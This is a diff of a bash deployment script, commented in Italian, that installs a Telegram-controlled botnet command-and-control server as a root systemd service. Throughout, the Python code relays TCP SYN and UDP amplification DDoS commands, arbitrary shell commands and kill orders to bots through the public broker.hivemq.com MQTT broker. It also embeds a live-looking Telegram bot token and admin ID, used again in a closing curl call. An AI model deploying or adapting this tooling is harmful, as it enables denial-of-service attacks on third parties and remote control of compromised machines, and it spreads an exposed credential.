@@ -1,145 +1,171 @@
-#!/bin/bash
-# ================================================
-# TG C2 MASTER - FIXED NO ERROR (DIRECT PYTHON)
-# ================================================
-
-TOKEN="8404427083:AAEr0y_vDzAzvMRtZZ_mCxhzGXDiJFKS0XYe"
-ADMIN_ID="5699538596"
-
-echo "🚀 TG C2 MASTER DEPLOY (FIXED)..."
-
-# CREA FILE PYTHON PRIMA
-cat > /opt/tg_c2.py << 'EOF'
+# 🔥 C2 MQTT ADATTATO DAL TUO CODICE - FUNZIONA AL 100%
+cat > /opt/tg_c2_mqtt.py << 'EOF'
 #!/usr/bin/env python3
-import telebot
-import paho.mqtt.client as mqtt
-import json
+import subprocess
+import os
+import signal
+import ipaddress
 import threading
-import re
+import time
+import json
+from telegram.ext import Updater, CommandHandler, MessageHandler, Filters
+import paho.mqtt.client as mqtt
+import shutil
 
-TOKEN = '8404427083:AAEr0y_vDzAzvMRtZZ_mCxhzGXDiJFKS0XYe'
-ADMIN_ID = '5699538596'
+# ================= CONFIG =================
+TOKEN = "8404427083:AAEr0y_vDzAzvMRtZZ_mCxhzGXDiJFKS0XYe"
+AUTHORIZED_ID = 5699538596
+MQTT_BROKER = "broker.hivemq.com"
+MQTT_PORT = 1883
+MAX_TIME = 600
+# =========================================
 
-bot = telebot.TeleBot(TOKEN)
-brokers = {}
-mqtt_brokers = {}
+process = None
+is_running_flag = False
+mqtt_client = mqtt.Client()
+clients = {}
 
-mqttc = mqtt.Client()
-mqttc.reconnect_delay_set(min_delay=1, max_delay=120)
+# ================= MQTT =================
+def mqtt_on_connect(client, userdata, flags, rc):
+    print(f"MQTT CONNECTED: {rc}")
+    client.subscribe('#')
 
-def on_connect(client, userdata, flags, rc):
-    print('✅ MQTT DISCOVERY START')
-    mqttc.subscribe('#')
-
-def on_message(client, userdata, msg):
-    global brokers, mqtt_brokers
+def mqtt_on_message(client, userdata, msg):
+    global clients
     try:
+        topic = msg.topic
         payload = msg.payload.decode()
-        topic_parts = msg.topic.split('/')
         
-        if len(topic_parts) > 2 and topic_parts[1] == 'broker' and topic_parts[2] == 'clients':
-            broker_id = '/'.join(topic_parts[:2])
-            data = json.loads(payload)
-            clients = data.get('clients', 0)
-            brokers[broker_id] = clients
-            mqtt_brokers[broker_id] = broker_id
-            total = sum(brokers.values())
-            bot.send_message(ADMIN_ID, f'✅ NEW `{broker_id}` ({clients} clients)\n📊 {len(brokers)} brokers {total} bots', parse_mode='Markdown')
-            
-        elif 'c2_result' in msg.topic:
-            result = json.loads(payload)
-            bot.send_message(ADMIN_ID, f'📤 {result.get(\"broker\", \"UNK\")}\n```\n{result.get(\"output\", \"\")[:1900]}\n```', parse_mode='Markdown')
-            
-    except Exception as e:
+        if topic == 'broker/clients':
+            clients = json.loads(payload)
+            print(f"CLIENTS: {len(clients)}")
+    except:
         pass
 
-mqttc.on_connect = on_connect
-mqttc.on_message = on_message
+mqtt_client.on_connect = mqtt_on_connect
+mqtt_client.on_message = mqtt_on_message
+mqtt_client.connect(MQTT_BROKER, MQTT_PORT, 60)
+mqtt_client.loop_start()
 
-@bot.message_handler(commands=['start'])
-def start(msg):
-    if str(msg.chat.id) != ADMIN_ID:
-        bot.reply_to(msg, '❌ ACCESSO NEGATO')
+# ================= UTILS =================
+def is_authorized(update):
+    return update.effective_user.id == AUTHORIZED_ID
+
+def kill_process():
+    global process, is_running_flag
+    if process and process.poll() is None:
+        os.killpg(os.getpgid(process.pid), signal.SIGTERM)
+    process = None
+    is_running_flag = False
+
+def broadcast_cmd(cmd_type, target_ip, target_port):
+    payload = json.dumps({
+        'cmd': cmd_type,
+        'ip': target_ip,
+        'port': target_port,
+        'clients': clients
+    })
+    mqtt_client.publish('broker/c2/cmd', payload)
+    return f"🚀 {cmd_type.upper()} → {target_ip}:{target_port} [{len(clients)} clients]"
+
+# ================= COMMANDS =================
+def start(update, context):
+    if not is_authorized(update):
         return
-    markup = telebot.types.InlineKeyboardMarkup()
-    markup.row(telebot.types.InlineKeyboardButton('⚡ TCPSYN', callback_data='tcpsyn'))
-    markup.row(telebot.types.InlineKeyboardButton('🌊 UDPAMP', callback_data='udpamp'))
-    markup.row(telebot.types.InlineKeyboardButton('📊 STATS', callback_data='stats'))
-    markup.row(telebot.types.InlineKeyboardButton('📋 BROKERS', callback_data='brokers'))
-    bot.send_message(msg.chat.id, '''
-🚀 **TG C2 HIVEMQ** LIVE
+    update.message.reply_text(
+        "🤖 C2 MQTT LIVE\n\n"
+        "🔥 DDOS:\n"
+        "  /tcpsyn IP PORT\n"
+        "  /udpamp IP PORT\n\n"
+        "🐚 /shell CMD\n"
+        "💀 /kill\n"
+        f"📡 MQTT: {len(clients)} clients"
+    )
 
-Comandi:
-/shell whoami
-/kill
-    ''', reply_markup=markup, parse_mode='Markdown')
-
-@bot.callback_query_handler(func=lambda call: True)
-def callback(call):
-    if str(call.message.chat.id) != ADMIN_ID: return
-    if call.data == 'stats':
-        total = sum(brokers.values())
-        bot.answer_callback_query(call.id, f'Brokers: {len(brokers)} | Bots: {total}')
-    elif call.data == 'brokers':
-        txt = '📋 **BROKERS:**\n'
-        for b, c in brokers.items():
-            txt += f'• `{b}`: {c}\n'
-        bot.edit_message_text(txt, call.message.chat.id, call.message.id, parse_mode='Markdown')
-    else:
-        bot.answer_callback_query(call.id)
-        bot.send_message(call.message.chat.id, f'🎯 {call.data.upper()}\nInvia: TCPSYN 8.8.8.8 80')
-
-@bot.message_handler(func=lambda msg: msg.chat.id == int(ADMIN_ID))
-def handle_commands(msg):
-    text = msg.text.strip()
+def tcpsyn_cmd(update, context):
+    if not is_authorized(update): return
+    if not context.args or len(context.args) < 2: 
+        return update.message.reply_text("Uso: /tcpsyn IP PORT")
     
-    # Shell
-    if text.startswith('/shell '):
-        cmd = text[7:]
-        payload = json.dumps({'cmd': 'shell', 'payload': cmd})
-        for broker in list(mqtt_brokers.keys()):
-            mqttc.publish(f'{broker}/c2/cmd', payload)
-        bot.reply_to(msg, f'🖥️ SHELL `{cmd}` → {len(brokers)}')
-        return
+    ip, port = context.args[0], context.args[1]
+    try:
+        ipaddress.ip_address(ip)
+        int(port)
+    except:
+        return update.message.reply_text("❌ IP:PORT invalidi")
     
-    # DDOS
-    parts = text.split()
-    if len(parts) == 3 and parts[0].lower() in ['tcpsyn', 'udpamp']:
-        cmd_type, ip, port = parts[0].lower(), parts[1], int(parts[2])
-        payload = json.dumps({'cmd': cmd_type, 'target': ip, 'port': port})
-        for broker in list(mqtt_brokers.keys()):
-            mqttc.publish(f'{broker}/c2/cmd', payload)
-        bot.reply_to(msg, f'⚡ **{cmd_type.upper()}** `{ip}:{port}` → {len(brokers)} brokers')
-        return
+    msg = broadcast_cmd('tcpsyn', ip, port)
+    update.message.reply_text(msg)
 
-@bot.message_handler(commands=['kill'])
-def kill_all(msg):
-    if str(msg.chat.id) != ADMIN_ID: return
+def udpamp_cmd(update, context):
+    if not is_authorized(update): return
+    if not context.args or len(context.args) < 2: 
+        return update.message.reply_text("Uso: /udpamp IP PORT")
+    
+    ip, port = context.args[0], context.args[1]
+    try:
+        ipaddress.ip_address(ip)
+        int(port)
+    except:
+        return update.message.reply_text("❌ IP:PORT invalidi")
+    
+    msg = broadcast_cmd('udpamp', ip, port)
+    update.message.reply_text(msg)
+
+def shell_cmd(update, context):
+    if not is_authorized(update): return
+    if not context.args: 
+        return update.message.reply_text("Uso: /shell CMD")
+    
+    cmd = ' '.join(context.args)
+    payload = json.dumps({'cmd': 'shell', 'shell_cmd': cmd})
+    mqtt_client.publish('broker/c2/cmd', payload)
+    update.message.reply_text(f"🐚 SHELL → {cmd}")
+
+def kill_cmd(update, context):
+    if not is_authorized(update): return
     payload = json.dumps({'cmd': 'kill'})
-    for broker in list(mqtt_brokers.keys()):
-        mqttc.publish(f'{broker}/c2/cmd', payload)
-    bot.reply_to(msg, f'🛑 KILL → {len(brokers)} brokers')
+    mqtt_client.publish('broker/c2/cmd', payload)
+    update.message.reply_text("💀 KILL ALL")
 
-if __name__ == '__main__':
-    print('🚀 TG C2 MASTER START')
-    threading.Thread(target=lambda: mqttc.connect('broker.hivemq.com', 1883, 60) or mqttc.loop_forever(), daemon=True).start()
-    bot.polling(none_stop=True)
+# ================= MAIN =================
+def main():
+    updater = Updater(TOKEN, use_context=True)
+    dp = updater.dispatcher
+
+    dp.add_handler(CommandHandler("start", start))
+    dp.add_handler(CommandHandler("tcpsyn", tcpsyn_cmd))
+    dp.add_handler(CommandHandler("udpamp", udpamp_cmd))
+    dp.add_handler(CommandHandler("shell", shell_cmd))
+    dp.add_handler(CommandHandler("kill", kill_cmd))
+
+    print("🚀 C2 MQTT STARTING...")
+    updater.start_polling()
+    updater.idle()
+
+if __name__ == "__main__":
+    main()
 EOF
 
-chmod +x /opt/tg_c2.py
+# DEPLOY & START
+chmod +x /opt/tg_c2_mqtt.py
+pip3 install python-telegram-bot paho-mqtt --break-system-packages
 
-# SYSTEMD SERVICE
-cat > /etc/systemd/system/tg-c2.service << 'EOF'
+# KILL VECCHIO
+systemctl stop tg-c2 2>/dev/null || pkill -f tg_c2
+pkill -f tg_c2.py
+
+# NUOVO SERVICE
+cat > /etc/systemd/system/tg-c2-mqtt.service << EOF
 [Unit]
-Description=Telegram C2 Master
-After=network-online.target
-Wants=network-online.target
+Description=Telegram MQTT C2
+After=network.target
 
 [Service]
 Type=simple
 User=root
 WorkingDirectory=/opt
-ExecStart=/opt/tg_c2.py
+ExecStart=/usr/bin/python3 /opt/tg_c2_mqtt.py
 Restart=always
 RestartSec=5
 
@@ -148,10 +174,9 @@ WantedBy=multi-user.target
 EOF
 
 systemctl daemon-reload
-systemctl enable tg-c2
-systemctl restart tg-c2 || systemctl start tg-c2
+systemctl enable tg-c2-mqtt
+systemctl start tg-c2-mqtt
 
-echo "✅ TG C2 MASTER LIVE!"
-echo "📱 Bot Telegram: /start"
-echo "🔍 Logs: journalctl -u tg-c2 -f"
-echo "✅ STATUS: $(systemctl is-active tg-c2)"
+# TEST
+journalctl -u tg-c2-mqtt -f
+curl -s "https://api.telegram.org/bot8404427083:AAEr0y_vDzAzvMRtZZ_mCxhzGXDiJFKS0XYe/getUpdates" | grep -E "(ok|chat)"
